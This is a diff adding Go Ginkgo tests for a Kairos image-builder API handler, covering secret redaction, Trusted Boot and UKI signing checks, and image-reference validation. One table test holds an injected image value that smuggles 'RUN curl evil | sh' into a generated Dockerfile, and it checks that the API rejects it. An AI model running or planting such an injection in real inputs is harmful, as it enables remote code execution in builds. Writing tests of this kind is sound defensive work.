@@ -87,6 +87,20 @@ var _ = Describe("ArtifactHandler", func() {
 			Expect(fb.lastOpts.ExtensionsCatalogs).To(Equal([]string{"https://example.test/releases.json"}))
 		})
 
+		It("has the builder redact every secret it hands it from the build log", func() {
+			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},` +
+				`"provisioning":{"userMode":"custom","username":"ops","password":"node-password-123"}}`
+			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+			req.Header.Set("Content-Type", "application/json")
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+
+			Expect(handler.Create(c)).To(Succeed())
+			Expect(rec.Code).To(Equal(http.StatusCreated))
+			Expect(fb.lastOpts.UploadToken).NotTo(BeEmpty())
+			Expect(fb.lastOpts.LogRedactValues).To(ContainElements("reg-token", "node-password-123", fb.lastOpts.UploadToken))
+		})
+
 		It("leaves the catalog list empty when the client sends none, so the default one is read", func() {
 			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"extensions":["nvidia"]}`
 			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
@@ -135,6 +149,144 @@ var _ = Describe("ArtifactHandler", func() {
 			Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
 			Expect(resp["error"]).To(ContainSubstring("not allowed over the API"))
 			Expect(fb.builds).To(BeEmpty())
+		})
+
+		DescribeTable("returns 400 for an image reference that would add lines to a generated Dockerfile",
+			func(jsonField, described string) {
+				// The JSON escape decodes to a real newline: written into a FROM
+				// line it would append a RUN instruction to the build.
+				body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"` + jsonField + `":"quay.io/kairos/ubuntu:24.04\nRUN curl evil | sh"}`
+				req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+				req.Header.Set("Content-Type", "application/json")
+				rec := httptest.NewRecorder()
+				c := e.NewContext(req, rec)
+
+				Expect(handler.Create(c)).To(Succeed())
+				Expect(rec.Code).To(Equal(http.StatusBadRequest))
+
+				var resp map[string]string
+				Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
+				Expect(resp["error"]).To(ContainSubstring(described))
+				Expect(fb.builds).To(BeEmpty())
+			},
+			Entry("baseImage", "baseImage", "base image"),
+			Entry("kairosInitImage", "kairosInitImage", "kairos-init image"),
+			Entry("hadronBase", "hadronBase", "hadron base"),
+		)
+
+		// A Trusted Boot image carries no GRUB and no separate initrd. Netboot
+		// and every disk image are built around those, so they fail on it.
+		DescribeTable("returns 400 for an output that cannot be built from a Trusted Boot image",
+			func(output string) {
+				body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"` + output + `":true,"trustedBoot":true}}`
+				req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+				req.Header.Set("Content-Type", "application/json")
+				rec := httptest.NewRecorder()
+				c := e.NewContext(req, rec)
+
+				Expect(handler.Create(c)).To(Succeed())
+				Expect(rec.Code).To(Equal(http.StatusBadRequest))
+
+				var resp map[string]string
+				Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
+				Expect(resp["error"]).To(ContainSubstring(output))
+				Expect(resp["error"]).To(ContainSubstring("Trusted Boot"))
+				Expect(fb.builds).To(BeEmpty())
+			},
+			Entry("netboot", "netboot"),
+			Entry("rawDisk", "rawDisk"),
+			Entry("cloudImage", "cloudImage"),
+			Entry("gce", "gce"),
+			Entry("vhd", "vhd"),
+			Entry("maas", "maas"),
+		)
+
+		// The UKI ISO only boots an image kairos-init prepared for Trusted Boot.
+		It("returns 400 for the UKI ISO without Trusted Boot", func() {
+			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"uki":true}}`
+			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+			req.Header.Set("Content-Type", "application/json")
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+
+			Expect(handler.Create(c)).To(Succeed())
+			Expect(rec.Code).To(Equal(http.StatusBadRequest))
+
+			var resp map[string]string
+			Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
+			Expect(resp["error"]).To(ContainSubstring("outputs.uki requires outputs.trustedBoot"))
+			Expect(fb.builds).To(BeEmpty())
+		})
+
+		// The installer ISO of a Trusted Boot image is the signed UKI ISO, so
+		// asking for the ISO on such a build asks for that one.
+		Describe("with a SecureBoot key set", func() {
+			BeforeEach(func() {
+				keys := &fakeSecureBootKeySetStore{keySets: []*store.SecureBootKeySet{
+					{ID: "ks-1", Name: "prod-keys", KeysDir: "/keys/prod", TPMPCRKeyPath: "/keys/prod/tpm2-pcr-private.pem"},
+					{ID: "ks-no-tpm", Name: "no-tpm", KeysDir: "/keys/no-tpm"},
+				}}
+				handler = handlers.NewArtifactHandler(fb, nil, nil, keys, nil, nil, "", "reg-token", "http://localhost:8080")
+			})
+
+			create := func(body string) *httptest.ResponseRecorder {
+				req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+				req.Header.Set("Content-Type", "application/json")
+				rec := httptest.NewRecorder()
+				Expect(handler.Create(e.NewContext(req, rec))).To(Succeed())
+				return rec
+			}
+
+			// The installer ISO of a Trusted Boot image is the signed UKI ISO,
+			// so asking for the ISO on such a build asks for that one.
+			It("builds the UKI ISO when a Trusted Boot build asks for the ISO", func() {
+				rec := create(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true,"tar":true,"trustedBoot":true},"signing":{"ukiKeySetId":"ks-1"}}`)
+
+				Expect(rec.Code).To(Equal(http.StatusCreated))
+				Expect(fb.builds).To(HaveLen(1))
+				Expect(fb.lastOpts.ISO).To(BeFalse())
+				Expect(fb.lastOpts.Outputs.ISO).To(BeFalse())
+				Expect(fb.lastOpts.Outputs.UKI).To(BeTrue())
+				Expect(fb.lastOpts.Outputs.Tar).To(BeTrue())
+				Expect(fb.lastOpts.Outputs.TrustedBoot).To(BeTrue())
+				Expect(fb.lastOpts.Signing.UKITPMPCRKey).To(Equal("/keys/prod/tpm2-pcr-private.pem"))
+			})
+
+			It("accepts a Trusted Boot build that asks for the UKI ISO alone", func() {
+				rec := create(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"uki":true,"trustedBoot":true},"signing":{"ukiKeySetId":"ks-1"}}`)
+
+				Expect(rec.Code).To(Equal(http.StatusCreated))
+				Expect(fb.builds).To(HaveLen(1))
+			})
+
+			// The UKI step needs all three keys and would otherwise fail
+			// minutes into the build, or fail to start on the operator backend.
+			DescribeTable("returns 400 for a Trusted Boot ISO it cannot sign",
+				func(signing string) {
+					rec := create(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true,"trustedBoot":true}` + signing + `}`)
+
+					Expect(rec.Code).To(Equal(http.StatusBadRequest))
+					var resp map[string]string
+					Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
+					Expect(resp["error"]).To(ContainSubstring("signing.ukiKeySetId"))
+					Expect(fb.builds).To(BeEmpty())
+				},
+				Entry("without a key set", ""),
+				Entry("with a key set that has no TPM PCR key", `,"signing":{"ukiKeySetId":"ks-no-tpm"}`),
+			)
+		})
+
+		It("accepts every image field when each holds a valid reference", func() {
+			body := `{"baseImage":"ubuntu:24.04","kairosInitImage":"quay.io/kairos/kairos-init:v0.5.0","hadronBase":"localhost:5000/kairos/hadron@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef","outputs":{"iso":true}}`
+			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+			req.Header.Set("Content-Type", "application/json")
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+
+			Expect(handler.Create(c)).To(Succeed())
+			Expect(rec.Code).To(Equal(http.StatusCreated))
+			// The reference reaches the builder as the user wrote it.
+			Expect(fb.lastOpts.BaseImage).To(Equal("ubuntu:24.04"))
 		})
 
 		It("returns 500 for a genuine server failure", func() {
@@ -349,7 +501,7 @@ var _ = Describe("ArtifactHandler", func() {
 
 	Describe("DELETE /artifacts/:id", func() {
 		var (
-			as             *fakeArtifactStore
+			as               *fakeArtifactStore
 			handlerWithStore *handlers.ArtifactHandler
 		)
 
@@ -410,7 +562,7 @@ var _ = Describe("ArtifactHandler", func() {
 
 	Describe("DELETE /artifacts/failed (ClearFailed)", func() {
 		var (
-			as             *fakeArtifactStore
+			as               *fakeArtifactStore
 			handlerWithStore *handlers.ArtifactHandler
 		)
 
